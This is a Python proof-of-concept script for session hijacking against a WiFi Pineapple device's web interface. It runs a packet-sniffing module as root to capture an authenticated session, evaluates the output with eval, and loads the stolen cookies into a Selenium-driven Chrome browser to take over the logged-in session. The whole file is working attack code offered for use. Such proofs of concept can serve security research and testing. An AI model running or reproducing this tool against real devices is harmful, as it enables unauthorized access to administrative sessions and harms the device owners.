"""
Selenium session hijacking proof of concept
Grabs a valid Pineapple authenticated session
Opens a selenium browser with the session credentials

Assumptions at current time of writing
-You can already sniff traffic to and from the Pineapple
--direct connect or some form of mitm
-you have root permissions to run this script
-prereqs for requests, scapy, and selenium have been met
-A valid session exists and is logged into the Pineapple
"""

if __name__ == "__main__":
    from sys import argv
    from os import popen
    from time import sleep
    from selenium import webdriver
    from legs.config import arg_config
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions

    options = arg_config(argv)
    url = "{ip:}:{port:}".format(ip=options["Target"]["ip4"], port=options["Target"]["web"])
    iface = options["Misc"]["iface"]

    print("Will be listening on {} and attacking {}".format(iface, url))

    # Get the session
    print("Grabbing the session...")
    # Current workaround to make things work
    #Selenium does not work right when running as root
    #scapy (essentially) requires root to use sinff()
    #Therefore, this script cannot run as root but needs to call the module
    # which returns session information as root
    #The following BS works but I hate it
    sudo_string = '''sudo python -c "from legs.attack import session_grab
print(session_grab('{iface:}', pine_ip='{ip:}', pine_port={port:}))"'''.format(iface=iface, ip=options["Target"]["ip4"],port=options["Target"]["web"])
    session = eval(popen(sudo_string).read())

    print("Creating driver...")
    driver = webdriver.Chrome()

    # Need to load a dummy page before we can set cookies
    print("Loading dummy page...")
    driver.get("http://{}".format(url))

    print("Loading wait...")
    WebDriverWait(driver, 10).until(expected_conditions.presence_of_element_located((By.ID, "submit")))

    print("Implicate wait...")
    sleep(1)

    print("Adding session to cookies...")
    for cookie in [{'name' : name, 'value': value} for name, value in session.items()]:
        print(cookie)
        driver.add_cookie(cookie)

    print("Refreshing page")
    driver.refresh()

    print("Have fun")
